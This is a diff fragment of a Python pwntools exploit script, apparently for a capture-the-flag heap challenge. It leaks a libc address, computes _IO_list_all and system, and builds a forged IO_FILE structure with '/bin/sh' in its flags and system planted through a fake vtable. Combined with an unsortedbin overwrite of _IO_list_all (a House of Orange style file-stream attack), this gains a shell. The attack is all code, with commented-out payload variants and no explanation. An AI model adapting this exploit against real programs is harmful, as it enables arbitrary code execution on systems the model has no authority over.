@@ -72,10 +72,33 @@ libc_addr=uu64(p.recv(6))
 print("libc_addr",type(libc_addr),hex(libc_addr))
 libc_base=libc_addr-0x00007fcb39486b78+0x7fcb390c3000
 print('libc_base',hex(libc_base))
+_IO_list_all=libc_base+libc.sym['_IO_list_all']
+print('_IO_list_all',hex(_IO_list_all))
 print('malloc_hook',libc_base+libc.sym['__malloc_hook'])
 system_addr=libc_base+libc.sym['system']
 print('system_addr',hex(system_addr))
-payload2=b'a'*0x10+p64(0)+p64(0x71)+p64(0)+p64(libc_base+libc.sym['__malloc_hook']-0x10)
+# payload2=b'a'*0x10+p64(0)+p64(0x71)+p64(0)+p64(_IO_list_all-0x10)
+
+fake_file  = IO_FILE_plus()
+fake_file._flags  = 0x0068732f6e69622f # /bin/sh
+fake_file._IO_read_ptr  = 0x61  # overwrite old_top_chunk's size
+fake_file._IO_read_base  = _IO_list_all - 0x10  # overwrite old_top_chunk's bk (for unsortedbin attack)
+fake_file._IO_write_base  = 0
+fake_file._IO_write_ptr  = 1
+fake_file._mode  = 0
+fake_file._old_offset  = system_addr
+fake_file.vtable  = heap_addr  # &old_top_chunk[12]
+fake_file.show()
+payload2=b'a'*0x10
+payload2+=str(fake_file).encode()
+# payload2+=p64(0xdeadbeef)+p64(_IO_list_all-0x10)
+# payload2 += p64(0) + p64(1)
+# payload2 = payload2.ljust(0xc0, b'\x00')
+# payload2 += p64(0) * 3 + p64(heap_addr + 0x5E8) + p64(0) * 2 + p64(system_addr)
+
+
+# stream += p64(1)           # value of _mode      so :  fp->_mode > 0                       2
+
 edit(0,len(payload2),payload2)
 print("prepare to edit")
 pause()
